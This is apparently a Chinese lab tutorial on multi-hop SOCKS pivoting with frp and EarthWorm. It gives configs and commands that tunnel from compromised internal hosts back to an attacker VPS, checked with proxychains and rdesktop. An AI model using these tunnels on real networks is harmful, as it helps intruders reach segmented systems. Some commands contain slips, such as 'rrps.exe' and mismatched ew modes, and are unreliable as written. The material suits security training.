## socks代理工具

> frp
>
> ew

## 环境概括

网络拓扑图如下：  
![image](https://image.3001.net/images/20210408/1617847519_606e64df87ef14beebf87.png!small)

网络信息

攻击者kali

> 172.16.102.45

web

> 172.16.102.35
>
> 10.10.3.100

ziyu

> 10.10.3.6
>
> 10.10.5.6

hexin

> 10.10.5.7
>
> 192.168.72.200

hexiao

> 192.168.72.210

## 0x01 frp

下载地址

> https://github.com/fatedier/frp/releases

##### 反向代理

vps配置：

frps.ini

    
    
    [common]
    bind_addr = 0.0.0.0
    bind_port = 7000
    

web配置

frpc.ini

    
    
    [common]
    server_addr = 172.16.102.40
    server_port = 7000
    [http_proxy]
    type = tcp
    remote_port = 7777
    plugin = socks5
    

vps执行

frps.exe -c frps.ini

![image](https://image.3001.net/images/20210407/1617779716_606d5c0437598711fbebc.png!small)

web执行

frpc.exe -c frpc.ini﻿

![image](https://image.3001.net/images/20210407/1617779819_606d5c6b64ddd09c58ab7.png!small)

成功运行

![image](https://image.3001.net/images/20210407/1617779996_606d5d1c1b464d906f449.png!small)

攻击机kali上配置proxychains4

vim /etc/proxychains4.conf

在注释掉socks4并添加socks5 172.16.102.40 7777﻿

![image](https://image.3001.net/images/20210407/1617780240_606d5e10c8f33a716693b.png!small)

测试连通性

proxychains4 rdesktop 10.10.3.6

![image](https://image.3001.net/images/20210407/1617780406_606d5eb6ac192151acf30.png!small)

二级代理

vps配置

frps.ini

    
    
    [common]
    bind_addr = 0.0.0.0
    bind_port = 7000
    

web配置

frpc.ini

    
    
    [common]
    server_addr = 172.16.102.40
    server_port = 7000
    [http_proxy]
    type = tcp
    local_ip = 10.10.3.100
    local_port = 7777
    remote_port = 7777
    

frps.ini

    
    
    [common]
    bind_addr = 10.10.3.100
    bind_port = 7000
    

ziyu配置

frpc.ini

    
    
    [common]
    server_addr = 10.10.3.100
    server_port = 7000
    [http_proxy]
    type = tcp
    remote_port = 7777
    plugin = socks5
    

vps执行

frps.exe -c frps.ini﻿

![image](https://image.3001.net/images/20210407/1617781323_606d624b17ab17ded07d2.png!small)

web执行

frpc.exe -c frpc.ini

![image](https://image.3001.net/images/20210407/1617781477_606d62e54a0acfedf4652.png!small)

frps.exe -c frps.ini

![image](https://image.3001.net/images/20210407/1617781665_606d63a14aedfce2b8213.png!small)

ziyu执行

frpc.exe -c frpc.ini﻿

![image](https://image.3001.net/images/20210407/1617781762_606d6402b4cc640324475.png!small)

成功运行

![image](https://image.3001.net/images/20210407/1617781872_606d6470d3fa389b5c944.png!small)

测试连通性

kali执行proxychains4 rdesktop 10.10.5.7﻿

![image](https://image.3001.net/images/20210407/1617782007_606d64f7b1909b699ec68.png!small)

三级代理

vps配置

frps.ini

    
    
    [common]
    bind_addr = 0.0.0.0
    bind_port = 7000
    

web配置

frpc.ini

    
    
    [common]
    server_addr = 172.16.102.40
    server_port = 7000
    [http_proxy]
    type = tcp
    local_ip = 10.10.3.100
    local_port = 7777
    remote_port = 7777
    

frps.ini

    
    
    [common]
    bind_addr = 10.10.3.100
    bind_port = 7000
    

ziyu配置

frpc.ini

    
    
    [common]
    server_addr = 10.10.3.100
    server_port = 7000
    [http_proxy]
    type = tcp
    local_ip = 10.10.5.6
    local_port = 7777
    remote_port = 7777
    

frps.ini

    
    
    [common]
    bind_addr = 10.10.5.6
    bind_port = 7000
    

hexin配置

frpc.ini

    
    
    [common]
    server_addr = 10.10.5.6
    server_port = 7000
    [http_proxy]
    type = tcp
    remote_port = 7777
    plugin = socks5
    

vps执行

rrps.exe -c frps.ini﻿

![image](https://image.3001.net/images/20210407/1617782740_606d67d4b4d57f18c74fd.png!small)

web执行

frpc.exe -c frpc.ini﻿

![image](https://image.3001.net/images/20210407/1617782809_606d6819b6b5e58d350b7.png!small)

`frps.exe -c frps.ini﻿`

![image](https://image.3001.net/images/20210407/1617782910_606d687e47fa1a32f9a81.png!small)

ziyu执行

frpc.exe -c frpc.ini﻿

![image](https://image.3001.net/images/20210407/1617783042_606d6902e5f2e8d915d6f.png!small)

frps.exe -c frps.ini﻿

![image](https://image.3001.net/images/20210407/1617783131_606d695bace2436754c88.png!small)

hexin执行

frpc.exe -c frpc.ini﻿

![image](https://image.3001.net/images/20210407/1617783225_606d69b9a7339457eb1c1.png!small)

成功运行

![image](https://image.3001.net/images/20210407/1617783324_606d6a1c3fd14b8689cee.png!small)

测试连通性

proxychains4 rdesktop 192.168.72.210﻿

![image](https://image.3001.net/images/20210407/1617783436_606d6a8c9f6b71cb02141.png!small)

## 0x02 ew

下载地址

https://github.com/idlefire/ew

Earthworm提供六种链路状态，可通过

-s

参数选定，分别为

ssocksd、rcsocks、rssocks 提供socks代理服务

lcx_listen、lcx_slave、lcx_tran 提供端口转发服务

### 反向代理

vps执行

ew -s rcsocks -l 1080 -e 1024

> vps监听1080和1024端口，等待攻击者机器访问1080端口，目标机器访问1024端口

![image](https://image.3001.net/images/20210407/1617784075_606d6d0b66e0078b4417d.png!small)

web执行

ew -s rssocks -d 172.16.102.40 -e 1024﻿

> 其中`-d`参数为vps地址

![image](https://image.3001.net/images/20210407/1617784201_606d6d893cb3f1083c530.png!small)

成功运行

![image](https://image.3001.net/images/20210407/1617784242_606d6db2d5b13a0e8704c.png!small)

在攻击机kali上配置proxychains4

vim /etc/proxychains4.conf

在文末注释点socks4，并添加socks5 172.16.102.40 1080﻿

![image](https://image.3001.net/images/20210407/1617785069_606d70ed4d54091bc25fb.png!small)

测试连通性

攻击机kali执行proxychains4 rdesktop 10.10.3.6﻿

![image](https://image.3001.net/images/20210407/1617785152_606d7140d1e2f844d0656.png!small)

二级代理

vps执行

ew -s lcx_listen -l 1080 -e 1024﻿

![image](https://image.3001.net/images/20210407/1617785318_606d71e6284f342249ebd.png!small)

ziyu执行

ew -s ssocksd -l 9999﻿

![image](https://image.3001.net/images/20210407/1617785454_606d726e76b8fb389bd09.png!small)

web执行

ew -s lcx_slave -d 172.16.102.40 -e 1024 -f 10.10.3.6 -g 9999﻿

![image](https://image.3001.net/images/20210407/1617785644_606d732c5548c739ade2e.png!small)

成功运行

![image](https://image.3001.net/images/20210407/1617785709_606d736d6a811a79a332b.png!small)

测试连通性

攻击机kali执行proxychains4 rdesktop 10.10.5.7﻿

![image](https://image.3001.net/images/20210407/1617785821_606d73dd2edb1825b6254.png!small)

三级代理

vps执行

ew -s rssocks -l 1080 -e 1024﻿

![image](https://image.3001.net/images/20210407/1617786065_606d74d10a066d108c462.png!small)

web执行

ew -s lcx_slave -d 172.16.102.40 -e 1024 -f 10.10.3.6 -g 9999﻿

![image](https://image.3001.net/images/20210407/1617786235_606d757b70ae2bbf45788.png!small)

ziyu执行

ew -s lcx_listen -l 9999 -e 7777﻿

![image](https://image.3001.net/images/20210407/1617786401_606d7621b43268823a90e.png!small)

hexin执行

ew -s rcsocks -d 10.10.5.6 -e 7777﻿

![image](https://image.3001.net/images/20210407/1617786532_606d76a4989e43fc84935.png!small)

成功运行

![image](https://image.3001.net/images/20210407/1617786588_606d76dc077de1be38c77.png!small)

测试连通性

攻击机kali执行proxychains4 rdesktop 192.168.72.210﻿

![image](https://image.3001.net/images/20210407/1617787866_606d7bda0b28d9af0f4f9.png!small)

